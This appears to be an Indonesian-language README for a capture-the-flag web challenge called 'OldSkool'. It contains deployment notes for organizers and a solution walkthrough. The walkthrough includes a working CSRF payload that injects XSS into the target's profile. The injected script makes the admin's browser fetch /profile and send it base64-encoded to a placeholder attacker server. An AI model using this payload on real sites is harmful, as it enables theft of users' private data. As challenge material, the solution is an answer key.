# OldSkool

## Description
Tolong testing aplikasi CurMas yang baru kami buat, terimakasih<br>
<br>
Author : Yeraisci

## Notes to Panitia
- Vulnnya CSRF + Self XSS
- Peserta gadikasih berkas apapun, cuma link ke webservice
- Tinggal docker compose up gan, portnya menyesuaikan
- Terserah mau buat quals apa final
- Di file *old_skool/visit.js*, di line 8 diganti ke ip webservice pas deploy

## How to Solve ?
- Host sebuah file HTML dengan payload CSRF untuk mengganti profile
- Nantinya link server yang nge-host HTML itu bisa dikirim user untuk dikunjungi admin, dengan ngerubah link pas report curhat
- Sebenernya cara gampangnya payload xss nya cuma img src ngeleak cookie admin
- Tapi, karena session cookie bawaan flask pake flag "HttpOnly" jadi pake cara lain
- Payload xss nya dibuat biar admin nge-fetch konten di /profile (kalo admin, ntar keluar flagnya) terus kirim ke server pemain
- Host payload html kayak gini:
```html
<form action="http://<IP WEBSERVICE TARGET>/profile" method="POST" enctype="text/plain">
  <input type="text" name='{"bio":"wow123","motto":"yea\"><sCrIPt>var xmlHttp = new XMLHttpRequest();xmlHttp.open( \"GET\", \"/profile\", false );xmlHttp.send( null );var url = \"https://<IP SERVER PEMAIN>/?a=\" + btoa(xmlHttp.responseText); var x = document.createElement(\"img\"); x.src = url; document.body.appendChild(x);</sCrIPT>", "a":"' value='"}'>
</form>
<script>
  document.forms[0].submit();
</script>
```
- Atau bisa juga lempar ke hookbin kalau gamau repot
- Terus kirim link yang nge-host html payload itu ke parameter "curhat_link" pas mau report suatu curhat
- Tunggu bentar, terus tinggal liat di listenernya, baikin base64nya, terus decode, dapet flag
